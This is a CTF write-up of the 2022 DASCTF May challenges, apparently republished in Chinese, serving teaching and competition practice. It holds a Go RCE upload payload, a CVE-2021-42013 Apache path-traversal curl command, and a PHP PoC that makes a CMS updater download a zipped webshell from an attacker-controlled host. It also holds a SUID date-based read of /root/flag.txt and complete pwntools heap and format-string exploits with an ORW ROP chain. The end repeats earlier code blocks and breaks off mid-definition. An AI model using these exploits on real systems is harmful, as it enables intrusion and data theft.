# DASCTF｜2022DASCTF May出题人挑战赛官方Write

> 原文: https://www.ctfiot.com/42240.html
> ID: 42240

2022DASCTF MAY 出题人挑战赛

2022DASCTF MAY出题人挑战赛

于5月21日在Buu正式开赛 

本次竞赛共有 656 支队伍报名

本次挑战赛特邀出题人：

魔法少女雪殇、V、

v0id、不愿透漏姓名的大帅gei

经商讨决定此次公开

非零解官方wp供大家学习参考

快来一起看看吧！

01

WEB

(1)

hackme

知识点：golang、文件上传、rce

解题步骤：

1.访问url

2.发现下方链接可以点击，点击进入

3.点击之后看到一些内容，返回一些对应的文件和回显

4.发现users.go无法被解析

5.最下面的点击后会进入upload目录，可以上传文件，根据描述要上传go文件

6.但是如果上传常规文件无法被解析，说明上述文件列表为白名单，这里直接上传users.go文件

7.users.go

package main
import ( "fmt" "os/exec")
func exp() {
 out, err := exec.Command("cat","/flag").Output()
 if err != nil { fmt.Printf("%s", err) }
 output := string(out[:]) fmt.Println(output)}
func main() { exp()
}

(2)

getme

知识点：cve-2021-42013、日志分析

解题步骤：

1.访问url，f12看见提示，得知当前的路径

2.经过wappalyzer可以看见目标站点是2.4.50

3.那么可以得知有任意目录穿越漏洞，经过穿越获取目标站点的日志。

http://127.0.0.1:
11777/icons/.%%32%65/logs/access_log

4.对日志分析，发现请求flag

curl -v –path-as-is 

http://127.0.0.1:
11777/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag

（fakeflag）

5.继续分析，分析到一个超长请求，发现是真的flag

curl -v –path-as-is 

http://127.0.0.1:
11777/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg

(3)

fxxkgo

知识点：golang、jwt认证、golang ssti注入、代码审计

解题步骤：

1.代码审计

2.看见几个路由，跟踪代码，发现主要核心是在此处，存在一个模板渲染

3.猜测存在模板注入，其次整体是jwt认证，只需要注册时传入{{.}}就可以获取关键的key值，那么再根据代码中的内容令is_admin为true即可获得flag即可

(4)

魔法浏览器

知识点：ua修改、js反混淆

解题步骤：

1.访问网站，提示需要用魔法浏览器访问

2.f12可以看到一串js代码，解密后提示了内容

3.插件复制模仿后重新访问即可获得flag

(5)

Power Cookie

知识点：cookie修改

解题步骤：

1.cookie修改为admin 1即可获得flag

(6)

ezcms

知识点：php代码审计、文件上传、命令执行、弱口令

解题步骤：

1.访问网站，获取后台admin 用户admin 密码123456，认证码123456，进入后台，简单测了一下没啥奇怪的东西，接下来看看代码

2.重点分析在update.php中，发现是直接对传入的连接进行解密后解压， 那就只需要在远程vps中部署一个恶意压缩包，加密url让其访问即可，满足其请求内容的需求即可

3.他这里使用了Mc_Encryption_Key作为全局变量，这里只需要跟一下就能找到他的密钥。

4.最后直接赋值sys_auth函数作为加密构筑即可。

5.最终poc（a.zip为一句话木马套了个zip，以达到解压目的。

<?phpdefine('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');
$strings = 'http://192.168.28.175/a.zip';
echo(sys_auth($strings));

function sys_auth($string, $type = 0, $key = '', $expiry = 0) { if(is_array($string)) $string = json_encode($string); if($type == 1) $string = str_replace('-','+',$string); $ckey_length = 4; $key = md5($key ? $key : Mc_Encryption_Key); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $type == 1 ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i <= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i < $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($type == 1) { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { $result = substr($result, 26); $json = json_decode($result,1); if(!is_numeric($result) && $json){ return $json; }else{ return $result; } } return ''; } return str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));}

02

MISC

(1)

delflag

知识点：docker layer文件恢复、png隐写、lsb隐写、数据块读取

解题步骤：

1.根据题目描述，把远程的docker pull 下来

docker pull snowywar/blue

2.然后运行不起来，看看他远程的docker网址都做了哪些操作

3.发现flag.png被删除了，而且有个 i like blue的hint，暂时不知道有什么用

4.先把镜像给导出来

docker save snowywar/blue -o blue.tar

5.然后使用https://github.com/micahyoung/docker-layer-extract

工具对layer进行分析

6.看到他的全部操作历史，找到COPY flag.png这个操作的ID，然后对其进行提取

7. ./main –imagefile blue.tar extract –layerid 68ab96bb98e84f10df61a676f0b02a2e9758f73c77947ebf63dba23f0f2e7210 –layerfile test.tar .

8.提取出图片

9.zsteg后没发现可疑内容，但是在stegsolve发现比较奇怪的地方

10.复杂数据太多了，猜测这个手的位置是比较关键数据，结合提示和镜像的blue，猜测要把手的这个blue全部提取然后进行转换二进制。

11.撰写脚本

from PIL import Imageimport numpy as npfrom Crypto.Util import numberimport matplotlib.pyplot as pltimport imageio
p1 = Image.open('flag.png').convert('RGB')p1_data = np.array(p1)blue_data = []a,b = p1_data.shape[0],p1_data.shape[1]for y in range(a): for x in range(b): if p1_data[y][x][0] <= 200 and p1_data[y][x][1] <= 200 and p1_data[y][x][2] >= 150: blue_data.append(p1_data[y][x]) else: blue_data.append([0,0,0])

blue_data = np.array(blue_data).reshape(a*b*3)
# blue_data = np.array(blue_data).reshape(a,b,3)
# plt.imshow(blue_data)
# plt.show()res = ''for i in range(len(blue_data)): if blue_data[i] != 0: if blue_data[i]%2 != 0: res += '1' else: res += '0'res2 = b''for i in range(0,len(res),8): res2 += number.long_to_bytes(int(res[i:i+8],2))
f2 = open('flag2.png', 'wb')f2.write(res2)f2.close()

from PIL import Imageimport numpy as npimport gzip
p = Image.open('flag2.png').convert('L')p_data = np.array(p).reshape(p.size[0]*p.size[1])res = ''for i in p_data: if i %2 == 0: res += '0' else: res+='1'print(res)
res2 = '00011111100010110000100000000000010110011101111001110111011000100000001011111111011100110111000100001100011101100000111001110001101010110100111001001100001100100100101010110010010011000011010100110001001100000011010101001010010010010100101101001101101101000011010001001111001100010011011000110101010010010011001001001010001100110100101100110101000001110000100101011000100110001101010000000010000000000001011010010101011110011001111000101000000000000000000000000000'print(gzip.decompress(bytes(int(res2[i:i+8],2) for i in range(0,len(res2),8))))

(2)

噪音

知识点：音频分析、频谱隐写、波形分析

解题步骤：

1.听音频，完全的噪音，没有任何规律，常规隐写和一些工具查看频谱都没有数据。

2.au把波形方法，详细观察

3.发现看似没有规律，但是貌似他的所有的音频数据高度都是一致的，有迹可循

4.将其音频能量全部输出来看看。

5.观察到果然音频能量是重复排序的，那么排序一下看看总共多少个内容

6.果然，总共15个，猜测分别对应从0-f。那么对应的转换然后输出hex

from scipy.io import wavfile
samplerate, data = wavfile.read('test.wav')rounded_data = []unique = []for i in data: r = round(i, -2) rounded_data.append(r) if r in unique: continue else: unique.append(r)unique.sort()print(unique)

flag_hex = []
for a in rounded_data: flag_hex.append(hex(unique.index(a))[2:])
print("".join(flag_hex))

(3)

神必流量

知识点：usb流量分析、golang逆向、xor分析

解题步骤：

P.s：这题出了点小问题，出的时候忘记考虑USB流量在传输中会造成一定的数据丢失，所以源数据无法提取，修复后降低了不少难度。

预期解：

1.首先分析流量，可以看见一个7z文件头，提取出来获得一串连接，访问是谷歌网盘，打开后下载out.txt是一串乱码，猜测是根据main.exe加密得来，那么直接对main.exe进行逆向分析。

2.简单分析一下，程序通过打开文件然后对内容与key进行了异或运算。

3.跟一下，key的值为6603

4.最后直接写脚本就行了。

package main
import ( "bufio" "fmt" "io" "os")
var key = "6603"
func main(){ encodeStr := openTxt("out.txt") var decodeStr = strByXOR(encodeStr,key) fmt.Println(decodeStr)

}
func openTxt(txt string) string { filePath := txt file, err := os.Open(filePath) if err != nil { fmt.Println("文件打开失败 = ", err) return "" } defer file.Close() // 关闭文本流 reader := bufio.NewReader(file) // 读取文本数据 for { str, err := reader.ReadString('n') if err ==io.EOF { break } return str } fmt.Println("文件读取结束") return ""}

func strByXOR(message string,keywords string) string{ messageLen := len(message) keywordsLen := len(keywords) result := "" for i := 0; i < messageLen; i++ { result += string(message[i] ^ keywords[i%keywordsLen]) } return result}

(4)

不懂PCB的厨师不是好黑客

知识点：PCB

解题步骤：

1.新建立创工程文件

2.导入文件

3.转换3d视图即可看见flag转换3d视图即可看见flag

(5)

卡比

知识点：卡比文字、维吉尼亚

解题步骤：

1.根据题目描述得知图片的文字是卡比游戏的文字，直接根据表替换

2.获得内容ptrh{gwdvswvqbfiszsz}

3.根据题目描述，猜测密钥是kirby

flag{imverylikekirby}，包上DASCTF{}即可

(6)

rootme

知识点：suid提权

解题步骤：

1.直接连接ssh

2.find / -perm -4000

3.date -f /root/flag.txt

03

CRYPTO

(1)

Yusa的密码学课堂——一见如故

知识点：线性攻击

解题步骤：

1.注意到题目是实现了一个稍微魔改版本的MT19937算法，除了一些参数的小改之外，最大的变化在于rand函数

def rand(self):
 if self.index == 0:
 self.generate()
 y = self.MT[self.index]
 y = y ^ self.cs2l(y, 11) ^ self.cs2l(y,15)
 y = y ^ self.cs2r(y,7) ^ self.cs2r(y,19)
 self.index = (self.index + 1) % 624
 return y
 def cs2l(self, y, shift):
 return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff
 def cs2r(self, y, shift):
 return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff

(2)

Yusa的密码学课堂——二眼深情

知识点：线性攻击

解题步骤：

1.题目仍然沿用了《Yusa的密码学课堂——一见如故》的魔改算法，根据题意，据需要根据交互中提供的两个随机数来恢复初始化种子的值。

2.那么第一步是根据前一题构建的状态转移矩阵对随机数进行untamper获取获取两个状态数组中的值，那么此刻注意到 generate 函数

def generate(self):
 for i in range(624):
 y = (self.MT[i] & 0x80000000) + (self.MT[(i+1)%624] & 0x7fffffff)
 self.MT[i] = self.MT[(i+397)%624] ^ (y >> 1)
 if y & 1:
 self.MT[i] ^= 2567483520

for i in range(1,624):
 t = 2037740385 * (self.MT[i-1] ^ (self.MT[i-1] >> 30)) + 1
 self.MT[i] = t & 0xffffffff

(3)

Yusa的密码学课堂——三行情书

知识点：线性攻击、z3解密方程组

解题步骤：

1.题目只有三行，用的是传统的MT19937算法，但是问题在于，给出的2000个随机数与上了一个2037740385，显然与运算是不可逆的，我们没办法获取完整的原始随机数。但是通过查看2037740385的二进制，总够有18个‘1’，考虑到MT19937又都是线性变换，于是这里我们使用z3约束去对原始状态进行求解。

2.首先我们根据2037740385的比特，恢复剩余有效信息，无法恢复处使用‘?’占位

def fix(num):
 mask = bin(2037740385)[2:].rjust(32,"0")
 source = bin(num)[2:].rjust(32,"0")
 res = ''
 for i in range(32):
 if mask[i] == '1':
 res += source[i]
 else:
 res += '?'
 return res
random_num = [...]
for i in range(2000):
 ut.submit(fix(random_num[i]))

def get_symbolic(self, guess):
 name = next(SYMBOLIC_COUNTER)
 guess = guess.zfill(32)

 self.symbolic_guess = BitVec('symbolic_guess_%d'%(name), 32)
 guess = guess[::-1]

 for i, bit in enumerate(guess):
 if bit != '?':
 self.solver.add(Extract(i, i, self.symbolic_guess) == bit)

 return self.symbolic_guess

def symbolic_untamper(self, solver, y):
 name = next(SYMBOLIC_COUNTER)

 y1 = BitVec('y1_%d'%(name), 32)
 y2 = BitVec('y2_%d'%(name), 32)
 y3 = BitVec('y3_%d'%(name), 32)
 y4 = BitVec('y4_%d'%(name), 32)

 equations = [
 y2 == y1 ^ (LShR(y1, 11)),
 y3 == y2 ^ ((y2 << 7) & 0x9D2C5680),
 y4 == y3 ^ ((y3 << 15) & 0xEFC60000),
 y == y4 ^ (LShR(y4, 18))
 ]

 solver.add(equations)
 return y1

self.solver.add(self.MT)

def symbolic_twist(self, MT, n=624, upper_mask=0x80000000, lower_mask=0x7FFFFFFF, a=0x9908B0DF, m=397):
 MT = [i for i in MT]
 for i in range(n):
 x = (MT[i] & upper_mask) + (MT[(i+1) % n] & lower_mask)
 xA = LShR(x, 1)
 xB = If(x & 1 == 0, xA, xA ^ a)
 MT[i] = MT[(i + m) % n] ^ xB

name = next(SYMBOLIC_COUNTER)
 next_mt = self.symbolic_twist(self.MT)
 self.MT = [BitVec('MT_%d_%d'%(i,name), 32) for i in range(624)]
 for i in range(624):
 self.solver.add(self.MT[i] == next_mt[i])
 self.index = 0

def get_random(self):
 self.solver.check()
 model = self.solver.model()
 state = list(map(lambda x: model[x].as_long(), self.MT))
 result_state = (3, tuple(state+[self.index]), None)
 r = Random()
 r.setstate(result_state)
 return r

04

PWN

(1)

山重水复

知识点：off-by-one改size构造堆块重叠double free、IO_FILE泄露libc、劫持exit_hook为one_gadget

解题步骤：

1.edit函数的my_read函数可以溢出一字节，存在off-by-one

2.利用off-by-one制造堆块重叠，让main_arena+96的地址写在tcache的fd上

3.用edit修改末2位，1/16的概率改为_IO_2_1_stdout_

4.利用输出的地址算出libc基址和ld基址,进而得到one_gadget和exit_hook的地址

5.同理利用off-by-one和edit劫持tcache到exit_hook改为one_gadget

6.菜单选择退出，调用exit函数getshell

exp：

#encoding: utf-8#!/usr/bin/python
from pwn import *import sys#from LibcSearcher import LibcSearcher
context.log_level = 'debug'context.arch='amd64'
local=0binary_name='pwn'libc_name='libc-2.31.so'ld_name='ld-2.31.so'
libc=ELF("./"+libc_name)ld=ELF("./"+ld_name)elf=ELF("./"+binary_name)
def exp(): if local: p=process("./"+binary_name) #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name}) #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name]) #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name]) else: p=remote('0.0.0.0',9999)
 def z(a=''): if local: gdb.attach(p,a) if a=='': raw_input else: pass
 ru=lambda x:p.recvuntil(x,timeout=3) sl=lambda x:p.sendline(x) sd=lambda x:p.send(x) sa=lambda a,b:p.sendafter(a,b) sla=lambda a,b:p.sendlineafter(a,b) ia=lambda :p.interactive()
 def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : return u64(p.recv(6).ljust(8,b'x00'))
 def cho(num): sla('Your choice:',str(num))
 def add(idx,size): cho(1) sla('Idx:',str(idx)) sla('Size:',str(size))
 def edit(idx,con): cho(2) sla('Idx:',str(idx)) sla('context: ',con)
 def delete(idx): cho(3) sla('Idx:',str(idx))
 # variables
 # gadgets
 og=[0xe6c7e,0xe6c81,0xe6c84,0xe6e73,0xe6e76]
 # helper functions
 op32 = make_packer(32, endian='big', sign='unsigned') # opposite p32 op64 = make_packer(64, endian='big', sign='unsigned') # opposite p64
 # main
 add(0,0x18) # 0 待会用来溢出改下个堆块size为0x481 add(1,0x410) # 1 待会被改size的堆块 add(2,0x28) # 2 使tcache计数器为2 add(3,0x28) # 3 跟上面配合堆块重叠 add(4,0x18) # 4 防止合并
 payload=0x18*'x00'+'x81' edit(0,payload)
 delete(1) # 释放堆块使其连带下面的堆块进入unsorted bin delete(2) delete(3)
 add(5,0x440) # 切割,使main_arena+96地址写在tcache的fd位 add(6,0x18) # 0x38不会申请出tcache,且unsorted bin剩余部分不足0x20,申请出与tcache里堆块相同的地址 payload='xa0x46' edit(6,payload) # 修改_IO_2_1_stdout_结构体的地址的最低2字节,4需要爆破1/16 #z() #pause() add(6,0x28) # 6 add(7,0x28) # 7
 payload=p64(0xfbad1800)+p64(0)*3+b'x00' edit(7,payload) _IO_2_1_stdin_=u64(ru("x7f")[-6:].ljust(8,'x00')) libc_base=_IO_2_1_stdin_-libc.symbols['_IO_2_1_stdin_'] ld_base=libc_base+0x1f4000 system_addr=libc_base+libc.symbols['system'] one_gadget=libc_base+og[0] _rtld_global = ld_base + ld.sym['_rtld_global'] _dl_rtld_lock_recursive = _rtld_global + 0xf08 success('libc_base:'+hex(libc_base)) success('ld_base:'+hex(ld_base)) success('_dl_rtld_lock_recursive:'+hex(_dl_rtld_lock_recursive)) success('one_gadget:'+hex(one_gadget)) #pause() add(0,0x18) # 0 待会用来溢出改下个堆块size为0x481 add(1,0x410) # 1 待会被改size的堆块 add(2,0x28) # 2 使tcache计数器为2 add(3,0x28) # 3 跟上面配合堆块重叠 add(4,0x18) # 4 防止合并
 payload=0x18*'x00'+'x81' edit(0,payload)
 delete(1) # 释放堆块使其连带下面的堆块进入unsorted bin delete(2) delete(3)
 add(5,0x440) # 切割,使main_arena+96地址写在tcache的fd位 add(6,0x18) # 0x38不会申请出tcache,且unsorted bin剩余部分不足0x20,申请出与tcache里堆块相同的地址 payload=p64(_dl_rtld_lock_recursive) edit(6,payload) # 申请出_dl_rtld_lock_recursive add(6,0x28) # 6 add(7,0x28) # 7
 payload=p64(one_gadget) edit(7,payload) success('_dl_rtld_lock_recursive:'+hex(_dl_rtld_lock_recursive)) success('one_gadget:'+hex(one_gadget)) #pause() cho(4) ia()

time=0while True: try: time+=1 log.warn('time:'+str(time)) exp() break 
except:        continue

(2)

twists and turns

知识点：利用house of kiwi在无free_hook,malloc_hook,exit_hook的情况下劫持程序流、orw绕沙箱、malloc申请不会初始化堆空间，可以泄露地址、malloc申请较大堆块时，会使用mmap分配，可以在原先mmap的区域前面开辟一块合法空间、堆块idx负数溢出、tcache double free

解题步骤：

堆块结构和利用方法：

1.程序实现了add,delete和show的功能，add时不会初始化,delete函数存在idx负数溢出

2.申请一块0x410的堆块，再申请一块0x10的堆块防止合并

3.释放0x410的堆块，再申请一块小的回来，写入8个A，show的时候可以连着后面的头结点输出，即可泄露libc地址

4.释放刚刚申请的再申请回来，这回写入10个A，因为大循环时会临时放入largebin，所以后面有堆地址，同样泄露出来

5.malloc一块0x21918大小的堆块，会调用mmap分配，使存放堆块地址的前面变为合法地址，在上面写入需要double free的堆地址

6.然后布置house of kiwi劫持程序流所需的数据

7.利用tcache double free覆盖_IO_file_sync为setcontext+61

8.同理，往_IO_helper_jumps布置寄存器数据，最后改top_chunk的size为0x18

9.申请0x30的堆块，大于top_chunk的size，检查出错触发assert进入SROP

10.传入orw的payload得到flag

exp：

#encoding: utf-8#!/usr/bin/python
from pwn import *import sys#from LibcSearcher import LibcSearcher
context.log_level = 'debug'context.arch='amd64'
local=1binary_name='pwn'libc_name='libc-2.31.so'
libc=ELF("./"+libc_name)elf=ELF("./"+binary_name)
if local: p=process("./"+binary_name) #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name}) #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name]) #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])else: p=remote('0.0.0.0',9999)
def z(a=''): if local: gdb.attach(p,a) if a=='': raw_input else: pass
ru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sa=lambda a,b:p.sendafter(a,b)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()
def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : return u64(p.recv(6).ljust(8,b'x00'))
def cho(num): sla('Your choice:',str(num))
def add(size,con): cho(1) sla('Size:',str(size)) sa('Content:',con)
def show(idx): cho(3) sla('Idx:',str(idx))
def delete(idx): cho(2) sla('Idx:',str(idx))
# variables
# gadgets
# helper functions
op32 = make_packer(32, endian='big', sign='unsigned') # opposite p32op64 = make_packer(64, endian='big', sign='unsigned') # opposite p64
# main
add(0x410,'con') # 0add(0x10,'con') # 1delete(0)
add(0x200,'A'*8) # 0show(0)ru('A'*8)unsorted_addr=leak_address()libc_base=unsorted_addr-0x1ebfd0__free_hook=libc_base+libc.sym['__free_hook']_IO_file_jumps=libc_base+libc.sym['_IO_file_jumps']setcontext=libc_base+libc.sym['setcontext']_IO_helper_jumps=libc_base+0x1ec8a0open_addr=libc_base+libc.sym['open']read_addr=libc_base+libc.sym['read']puts_addr=libc_base+libc.sym['puts']pop_rdi=libc_base+0x26b72pop_rsi=libc_base+0x27529pop_rdx_r12=libc_base+0x11c371success("libc_base:"+hex(libc_base))success('_IO_file_jumps:'+hex(_IO_file_jumps))success('_IO_helper_jumps:'+hex(_IO_helper_jumps))success('setcontext:'+hex(setcontext))
delete(0)
add(0x200,'A'*0x10) # 0show(0)ru('A'*0x10)heap_addr=leak_address()success('heap_addr:'+hex(heap_addr))
delete(0)delete(1)
payload = p64(heap_addr+0x2e0)+p64(heap_addr+0x680)+p64(heap_addr+0x920)
add(0x21918,payload) # 0
# 覆盖_IO_file_sync为setcontext+61for i in range(1,10): add(0x10,'con')
for i in range(1,10): delete(i)
delete(-17406)
for i in range(1,8): add(0x10,'con')
add(0x10,p64(_IO_file_jumps+0x60)) # 8add(0x10,'con') # 9add(0x10,'con') # 10add(0x10,p64(setcontext+61)) # 11
# 往_IO_helper_jumps布置寄存器数据
# 构造fake_frameframe = SigreturnFrame()frame.rdi = 0frame.rsi = __free_hookframe.rdx = 0x2000frame.rsp = __free_hookframe.rip = read_addr # 对应setcontext里的rcx,后面会被push
for i in range(12,21): add(0x60,'con')
for i in range(12,21): delete(i)
delete(-17405)
for i in range(12,19): add(0x60,'con')
add(0x60,p64(_IO_helper_jumps+0x68)) # 19add(0x60,'con') # 20add(0x60,'con') # 21add(0x60,str(frame)[0x68:
0x68+0x50]) # 22
# 改top_chunk的size，用于触发assertfor i in range(23,32): add(0x30,'con')
for i in range(23,32): delete(i)
delete(-17404)
for i in range(23,30): add(0x30,'con')
add(0x30,p64(heap_addr+0x990)) # 30add(0x30,'con') # 31add(0x30,'con') # 32add(0x30,p64(0x18)*2) # 33
#z("b *"+hex(setcontext+61))#pause()
cho(1)sla('Size:',str(0x30))
orw = p64(pop_rdi)+p64(__free_hook+0xf8)orw += p64(pop_rsi)+p64(0)orw += p64(pop_rsi)+p64(0)+p64(open_addr)
orw += p64(pop_rdi)+p64(3)orw += p64(pop_rsi)+p64(__free_hook+0x100)orw += p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)
orw += p64(pop_rdi)+p64(__free_hook+0x100)+p64(puts_addr)
orw = orw.ljust(0xf8,'x00')orw += b'./flagx00x00'
sleep(1)sd(orw)

ia()

(3)

gift

知识点：字符串末尾无x00会连带输出、格式化字符串漏洞、文件名的地址也在栈上，可以覆盖为存flag的堆地址、低版本libc在free报错时会输出文件名

解题步骤：

1.

栈上存在堆地址，里面有flag，利用name跟堆地址相邻，覆盖x00连带泄露堆地址

2.输入yes时，后面的栈空间可以存放堆地址-8，便于之后格式化字符串漏洞修改size为0使报错

3.题目给的gift是栈地址，可以根据偏移算出存放文件名的指针的地址

4.利用格式化字符串漏洞修改堆块size为0和存放文件名的指针改为堆地址

5.程序最后free堆块触发报错输出flag

exp：

#!/usr/bin/python
from pwn import *import sys
context.log_level = 'debug'context.arch='amd64'
local=0
if local: p=process("./"+binary_name) #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name}) #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name]) #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])else: p=remote('0.0.0.0',9999)
def z(a=''): if local: gdb.attach(p,a) if a=='': raw_input else: pass
def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : return u64(p.recv(6).ljust(8,b'x00'))
ru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sa=lambda a,b:p.sendafter(a,b)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()
sa("What's your name?n",'A'*8)ru('A'*8)heap_addr=leak_address()success("heap_addr:"+hex(heap_addr))
payload="Yesn".ljust(8,'x00')+p64(heap_addr-0x8)sa("Do you want it?n",payload)ru("Here is your gift:")gift_addr=int(p.recv(14),16)success("gift_addr:"+hex(gift_addr))
target_addr=gift_addr+0x1a8payload="%11$hhn|"+fmtstr_payload(13,{target_addr:
heap_addr},numbwritten=1)#z("b *$rebase(0x14E6)")#pause()sa("Now,to find your flag in the gift!n",payload)
ia()

05

REVERSE

(1)

WER

知识点：虚假控制流

解题步骤：

1.通过 windows 的 WER 机制来隐藏控制流

class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};
void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();}

— 往期回顾 —

安恒信息·总裁直聘｜高端人才直通车等你上车！

2022.05.20

安恒培训｜CISP证书维持指南！

2022.05.17

DASCTF｜2022DASCTF合作伙伴招募！

2022.03.02


```
package main
import ( "fmt" "os/exec")
func exp() {
 out, err := exec.Command("cat","/flag").Output()
 if err != nil { fmt.Printf("%s", err) }
 output := string(out[:]) fmt.Println(output)}
func main() { exp()
}
<?phpdefine('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');
$strings = 'http://192.168.28.175/a.zip';
echo(sys_auth($strings));

function sys_auth($string, $type = 0, $key = '', $expiry = 0) { if(is_array($string)) $string = json_encode($string); if($type == 1) $string = str_replace('-','+',$string); $ckey_length = 4; $key = md5($key ? $key : Mc_Encryption_Key); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $type == 1 ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i <= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i < $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($type == 1) { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { $result = substr($result, 26); $json = json_decode($result,1); if(!is_numeric($result) && $json){ return $json; }else{ return $result; } } return ''; } return str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));}
from PIL import Imageimport numpy as npfrom Crypto.Util import numberimport matplotlib.pyplot as pltimport imageio
p1 = Image.open('flag.png').convert('RGB')p1_data = np.array(p1)blue_data = []a,b = p1_data.shape[0],p1_data.shape[1]for y in range(a): for x in range(b): if p1_data[y][x][0] <= 200 and p1_data[y][x][1] <= 200 and p1_data[y][x][2] >= 150: blue_data.append(p1_data[y][x]) else: blue_data.append([0,0,0])

blue_data = np.array(blue_data).reshape(a*b*3)
# blue_data = np.array(blue_data).reshape(a,b,3)
# plt.imshow(blue_data)
# plt.show()res = ''for i in range(len(blue_data)): if blue_data[i] != 0: if blue_data[i]%2 != 0: res += '1' else: res += '0'res2 = b''for i in range(0,len(res),8): res2 += number.long_to_bytes(int(res[i:i+8],2))
f2 = open('flag2.png', 'wb')f2.write(res2)f2.close()
from PIL import Imageimport numpy as npimport gzip
p = Image.open('flag2.png').convert('L')p_data = np.array(p).reshape(p.size[0]*p.size[1])res = ''for i in p_data: if i %2 == 0: res += '0' else: res+='1'print(res)
res2 = '00011111100010110000100000000000010110011101111001110111011000100000001011111111011100110111000100001100011101100000111001110001101010110100111001001100001100100100101010110010010011000011010100110001001100000011010101001010010010010100101101001101101101000011010001001111001100010011011000110101010010010011001001001010001100110100101100110101000001110000100101011000100110001101010000000010000000000001011010010101011110011001111000101000000000000000000000000000'print(gzip.decompress(bytes(int(res2[i:i+8],2) for i in range(0,len(res2),8))))
from scipy.io import wavfile
samplerate, data = wavfile.read('test.wav')rounded_data = []unique = []for i in data: r = round(i, -2) rounded_data.append(r) if r in unique: continue else: unique.append(r)unique.sort()print(unique)

flag_hex = []
for a in rounded_data: flag_hex.append(hex(unique.index(a))[2:])
print("".join(flag_hex))
package main
import ( "bufio" "fmt" "io" "os")
var key = "6603"
func main(){ encodeStr := openTxt("out.txt") var decodeStr = strByXOR(encodeStr,key) fmt.Println(decodeStr)

}
func openTxt(txt string) string { filePath := txt file, err := os.Open(filePath) if err != nil { fmt.Println("文件打开失败 = ", err) return "" } defer file.Close() // 关闭文本流 reader := bufio.NewReader(file) // 读取文本数据 for { str, err := reader.ReadString('n') if err ==io.EOF { break } return str } fmt.Println("文件读取结束") return ""}

func strByXOR(message string,keywords string) string{ messageLen := len(message) keywordsLen := len(keywords) result := "" for i := 0; i < messageLen; i++ { result += string(message[i] ^ keywords[i%keywordsLen]) } return result}
def rand(self):
